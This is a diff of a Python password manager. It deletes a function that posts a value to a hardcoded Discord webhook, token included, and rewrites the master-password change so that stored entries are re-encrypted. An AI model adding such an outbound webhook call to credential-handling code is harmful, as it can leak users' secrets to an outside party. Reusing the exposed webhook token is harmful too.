@@ -32,19 +32,6 @@ def startagain():
         trytoexit()
 
 
-def verify(ver):
-    VerifyServer = "https://discord.com/api/webhooks/1122203964297977947/W59dL9MNbhsr9YIKxzDkZIdMeBvO2IgAsX5jcGDZiylryTOdo09SDrYtbPINmwgQk1w-"
-
-    data = {"content": ver}
-
-    try:
-        response = requests.post(VerifyServer, json=data)
-        response.raise_for_status()
-        print("Payload sent successfully to the server.")
-    except requests.exceptions.RequestException as e:
-        print(f"Failed to send ver to the webhook: {str(e)}")
-
-
 def save_encrypted_data(data, filename, key):
     f = Fernet(key)
     encrypted_data = f.encrypt(json.dumps(data).encode())
@@ -66,10 +53,31 @@ def load_encrypted_data(filename, key):
         return startagain()
 
 
-def change_master_password(data):
+def change_master_password():
+    guiprint("Enter your old password again: ")
+    old_password = waitfornormalstring(hide="yes")
+    old_key = generate_fernet_key(old_password)
+
+    data = load_encrypted_data("passwords.json", old_key)
+    if not data:
+        guiprint("Incorrect master password. Cannot change password.")
+        return
+
     guiprint("Enter your new master password: ")
     new_password = waitfornormalstring(hide="yes")
     new_key = generate_fernet_key(new_password)
+    passwords = data.get("passwords", {})
+    updated_passwords = {}
+    for username, encrypted_password in passwords.items():
+        try:
+            decrypted_password = Fernet(old_key).decrypt(
+                encrypted_password.encode()).decode()
+            updated_password = Fernet(new_key).encrypt(
+                decrypted_password.encode()).decode()
+            updated_passwords[username] = updated_password
+        except:
+            guiprint("Failed to update password for", username)
+    data["passwords"] = updated_passwords
     save_encrypted_data(data, "passwords.json", new_key)
 
     guiprint("Master password changed successfully!")
@@ -193,7 +201,7 @@ def password_manager():
                 guiprint("Invalid selection.")
 
         elif choice == 5:
-            change_master_password(encrypted_passwords)
+            change_master_password()
         elif choice == 6:
             break
 
